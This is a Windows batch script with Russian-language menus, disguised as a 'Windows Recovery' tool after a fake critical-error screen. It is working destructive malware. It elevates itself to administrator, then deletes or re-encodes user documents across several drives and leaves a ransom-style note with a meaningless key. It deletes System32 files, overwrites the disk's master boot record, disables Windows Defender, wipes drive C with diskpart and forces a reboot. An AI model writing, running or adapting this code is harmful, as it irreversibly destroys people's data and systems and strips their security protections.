@echo off
chcp 1251 >nul
title Windows Recovery
color 4f
mode con cols=70 lines=20

:: Проверка прав администратора
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell start-process '%0' -verb runas
    exit
)

:start
cls
echo ╔══════════════════════════════════════════════════╗
echo ║         ╔═╗╔═╗╔╦╗╔═╗╔╗╔╔╦╗╔═╗                  ║
echo ║         ║ ║║ ║║║║║╣ ║║║ ║ ║╣                   ║
echo ║         ╚═╝╚═╝╩ ╩╚═╝╝╚╝ ╩ ╚═╝                  ║
echo ╠══════════════════════════════════════════════════╣
echo ║                                                  ║
echo ║     ОБНАРУЖЕНА КРИТИЧЕСКАЯ ОШИБКА СИСТЕМЫ       ║
echo ║                                                  ║
echo ║     Для восстановления работоспособности        ║
echo ║     выберите вариант действий:                   ║
echo ║                                                  ║
echo ╠══════════════════════════════════════════════════╣
echo ║                                                  ║
echo ║  [1] ВОССТАНОВЛЕНИЕ СИСТЕМЫ                      ║
echo ║      (шифрование данных + удаление System32)     ║
echo ║                                                  ║
echo ║  [2] БЫСТРОЕ ФОРМАТИРОВАНИЕ                      ║
echo ║      (очистка диска C + удаление Windows)        ║
echo ║                                                  ║
echo ║  [3] ОТМЕНА                                       ║
echo ║      (выход без последствий)                     ║
echo ║                                                  ║
echo ╚══════════════════════════════════════════════════╝
echo.
set /p choice="Выберите действие (1-3): "

if "%choice%"=="1" goto destroy
if "%choice%"=="2" goto format
if "%choice%"=="3" exit
goto start

:destroy
cls
echo ╔══════════════════════════════════════════════════╗
echo ║         ВОССТАНОВЛЕНИЕ СИСТЕМЫ...                ║
echo ╚══════════════════════════════════════════════════╝
echo.

:: Шифрование файлов (XOR примитив)
echo [1/4] Шифрование пользовательских данных...

set key=42
set drives=C D E F

for %%d in (%drives%) do (
    if exist %%d:\ (
        echo   Обработка диска %%d:...
        dir %%d:\*.doc %%d:\*.docx %%d:\*.xls %%d:\*.xlsx %%d:\*.pdf %%d:\*.jpg %%d:\*.png %%d:\*.txt /s/b >%temp%\files.txt 2>nul
        
        for /f "usebackq delims=" %%f in (%temp%\files.txt) do (
            if exist "%%f" (
                <nul set /p="."
                certutil -encode "%%f" "%temp%\tmp.enc" >nul 2>&1
                copy /y "%temp%\tmp.enc" "%%f.locked" >nul 2>&1
                del "%%f" >nul 2>&1
            )
        )
        echo.
    )
)

:: Создание сообщения
echo [2/4] Создание сообщения...
echo ======================================== > "%userprofile%\Desktop\README_LOCKED.txt"
echo ВАЖНО! >> "%userprofile%\Desktop\README_LOCKED.txt"
echo ======================================== >> "%userprofile%\Desktop\README_LOCKED.txt"
echo. >> "%userprofile%\Desktop\README_LOCKED.txt"
echo Ваши файлы зашифрованы алгоритмом XOR. >> "%userprofile%\Desktop\README_LOCKED.txt"
echo Для восстановления требуется специальный ключ. >> "%userprofile%\Desktop\README_LOCKED.txt"
echo. >> "%userprofile%\Desktop\README_LOCKED.txt"
echo Ключ шифрования: %random%%random%%random% >> "%userprofile%\Desktop\README_LOCKED.txt"
echo. >> "%userprofile%\Desktop\README_LOCKED.txt"
echo НЕ ВЫКЛЮЧАЙТЕ КОМПЬЮТЕР! >> "%userprofile%\Desktop\README_LOCKED.txt"

:: Удаление System32
echo [3/4] Удаление системных файлов...
takeown /f C:\Windows\System32\* /r /d y >nul 2>&1
icacls C:\Windows\System32\* /grant %username%:F /t /c /q >nul 2>&1

del /f /s /q C:\Windows\System32\*.dll >nul 2>&1
del /f /s /q C:\Windows\System32\*.exe >nul 2>&1
del /f /s /q C:\Windows\System32\*.sys >nul 2>&1
rmdir /s /q C:\Windows\System32\config >nul 2>&1
rmdir /s /q C:\Windows\System32\drivers >nul 2>&1

:: Повреждение MBR
echo [4/4] Модификация загрузочной записи...
powershell -Command "$mbr=New-Object byte[] 512;for($i=0;$i -lt 512;$i++){$mbr[$i]=0xFF};[System.IO.File]::WriteAllBytes('\\.\PHYSICALDRIVE0',$mbr)" >nul 2>&1

:: Финальное сообщение
cls
echo ╔══════════════════════════════════════════════════╗
echo ║         ВОССТАНОВЛЕНИЕ ЗАВЕРШЕНО!                ║
echo ╠══════════════════════════════════════════════════╣
echo ║                                                  ║
echo ║  Система успешно восстановлена.                  ║
echo ║  Все данные зашифрованы.                         ║
echo ║  System32 удалена.                               ║
echo ║  MBR модифицирована.                             ║
echo ║                                                  ║
echo ║  ПЕРЕЗАГРУЗКА ЧЕРЕЗ 15 СЕКУНД...                 ║
echo ║                                                  ║
echo ╚══════════════════════════════════════════════════╝
shutdown /r /f /t 15
exit

:format
cls
echo ╔══════════════════════════════════════════════════╗
echo ║         ФОРМАТИРОВАНИЕ ДИСКА C:...               ║
echo ╚══════════════════════════════════════════════════╝
echo.

:: Отключение защиты
echo [1/3] Отключение системной защиты...
net stop WinDefend /y >nul 2>&1
sc config WinDefend start= disabled >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1

:: Очистка диска
echo [2/3] Очистка диска C:...
echo Внимание: удаление файлов...
del /f /s /q C:\*.* >nul 2>&1
rmdir /s /q C:\Windows >nul 2>&1
rmdir /s /q "C:\Program Files" >nul 2>&1
rmdir /s /q "C:\Program Files (x86)" >nul 2>&1
rmdir /s /q C:\Users >nul 2>&1
rmdir /s /q C:\Temp >nul 2>&1

:: Форматирование через diskpart
echo [3/3] Форматирование...
(
echo select volume C
echo clean
echo create partition primary
echo format fs=ntfs quick label="SYSTEM"
echo active
echo exit
) > %temp%\diskpart.txt

diskpart /s %temp%\diskpart.txt >nul 2>&1

:: Финальное сообщение
cls
echo ╔══════════════════════════════════════════════════╗
echo ║         ФОРМАТИРОВАНИЕ ЗАВЕРШЕНО!                ║
echo ╠══════════════════════════════════════════════════╣
echo ║                                                  ║
echo ║  Диск C: полностью очищен.                       ║
echo ║  Windows удален.                                 ║
echo ║  Система готова к переустановке.                 ║
echo ║                                                  ║
echo ║  ПЕРЕЗАГРУЗКА ЧЕРЕЗ 10 СЕКУНД...                 ║
echo ║                                                  ║
echo ╚══════════════════════════════════════════════════╝
shutdown /r /f /t 10
exit
